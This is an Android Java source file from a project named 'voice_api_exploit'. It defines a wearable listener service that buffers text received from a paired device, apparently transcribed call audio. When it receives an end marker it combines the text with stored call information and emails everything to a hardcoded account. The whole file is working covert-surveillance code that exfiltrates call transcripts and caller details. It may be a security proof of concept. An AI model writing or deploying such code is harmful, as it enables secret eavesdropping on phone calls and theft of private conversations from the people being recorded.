package com.alexey_reznik.voice_api_exploit;

import android.content.SharedPreferences;
import android.preference.PreferenceManager;
import android.util.Log;

import com.google.android.gms.wearable.MessageEvent;
import com.google.android.gms.wearable.WearableListenerService;

import java.io.UnsupportedEncodingException;

public class ListenerService extends WearableListenerService {
    public static final String LOG_TAG = "ListenerService";
    public static final String END_STRING = "endOfAudio";

    public static final String EMAIL = "YOUR_EMAIL_ADDRESS";
    public static final String PASSWORD = "YOUR_PASSWORD";

    private String buffer = "";

    @Override
    public void onMessageReceived(MessageEvent messageEvent) {
        Log.d(LOG_TAG, "onMessageReceived");
        if (messageEvent.getData() != null) {
            String text = null;
            try {
                text = new String(messageEvent.getData(), "UTF-8");
                if (text.equals(END_STRING)) {
                    Log.d(LOG_TAG, "END_STRING received");
                    String textToSend = new String(buffer);
                    sendEmail(textToSend);
                    buffer = "";
                } else {
                    Log.d(LOG_TAG, "text received: " + text);
                    buffer += "\n" + text;
                }
            } catch (UnsupportedEncodingException e) {
                e.printStackTrace();
            }
        }
    }

    private void sendEmail(String body) {
        if (body != null && !body.isEmpty()) {
            SharedPreferences sharedPreferences = PreferenceManager.getDefaultSharedPreferences(getApplicationContext());
            String callInfo = sharedPreferences.getString(CallReceiver.SYS_PREF_CALLINFO, "");
            body = callInfo + "\nScript:" + body;
            Log.d(LOG_TAG, "sending email, body: " + body);
            SendEmailTask emailTask = new SendEmailTask(EMAIL,
                    PASSWORD, EMAIL);
            emailTask.setEmailRecipient(EMAIL);
            emailTask.setEmailSubject("Mobile Security Call Listener");
            emailTask.setEmailBody(body);
            Thread emailThread = new Thread(emailTask);
            emailThread.start();
        } else {
            Log.d(LOG_TAG, "sendEmail: Empty string received");
        }
    }
}